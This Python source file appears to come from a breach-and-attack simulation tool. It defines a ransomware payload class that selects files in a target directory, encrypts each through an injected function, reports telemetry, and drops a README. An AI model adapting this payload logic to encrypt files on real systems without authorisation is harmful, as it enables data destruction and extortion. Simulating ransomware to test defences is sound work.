import logging
import threading
from pathlib import Path
from typing import Callable, Iterable

from infection_monkey.telemetry.file_encryption_telem import FileEncryptionTelem
from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger
from infection_monkey.utils.threading import interruptible_iter

from .consts import README_FILE_NAME, README_SRC
from .ransomware_options import RansomwareOptions

logger = logging.getLogger(__name__)


class Ransomware:
    def __init__(
        self,
        config: RansomwareOptions,
        encrypt_file: Callable[[Path], None],
        select_files: Callable[[Path], Iterable[Path]],
        leave_readme: Callable[[Path, Path], None],
        telemetry_messenger: ITelemetryMessenger,
    ):
        self._config = config

        self._encrypt_file = encrypt_file
        self._select_files = select_files
        self._leave_readme = leave_readme
        self._telemetry_messenger = telemetry_messenger

        self._target_directory = self._config.target_directory
        self._readme_file_path = (
            self._target_directory / README_FILE_NAME  # type: ignore
            if self._target_directory
            else None
        )

    def run(self, interrupt: threading.Event):
        if not self._target_directory:
            return

        logger.info("Running ransomware payload")

        if self._config.encryption_enabled:
            files_to_encrypt = self._find_files()
            self._encrypt_files(files_to_encrypt, interrupt)

        if self._config.readme_enabled:
            self._leave_readme_in_target_directory(interrupt)

    def _find_files(self) -> Iterable[Path]:
        logger.info(f"Collecting files in {self._target_directory}")
        return self._select_files(self._target_directory)  # type: ignore

    def _encrypt_files(self, files_to_encrypt: Iterable[Path], interrupt: threading.Event):
        logger.info(f"Encrypting files in {self._target_directory}")

        interrupted_message = (
            "Received a stop signal, skipping remaining files for encryption of ransomware payload"
        )
        for filepath in interruptible_iter(files_to_encrypt, interrupt, interrupted_message):
            try:
                logger.debug(f"Encrypting {filepath}")
                self._encrypt_file(filepath)
                self._send_telemetry(filepath, True, "")
            except Exception as ex:
                logger.warning(f"Error encrypting {filepath}: {ex}")
                self._send_telemetry(filepath, False, str(ex))

    def _send_telemetry(self, filepath: Path, success: bool, error: str):
        encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
        self._telemetry_messenger.send_telemetry(encryption_attempt)

    def _leave_readme_in_target_directory(self, interrupt: threading.Event):
        if interrupt.is_set():
            logger.debug("Received a stop signal, skipping leave readme")
            return

        try:
            self._leave_readme(README_SRC, self._readme_file_path)  # type: ignore
        except Exception as ex:
            logger.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
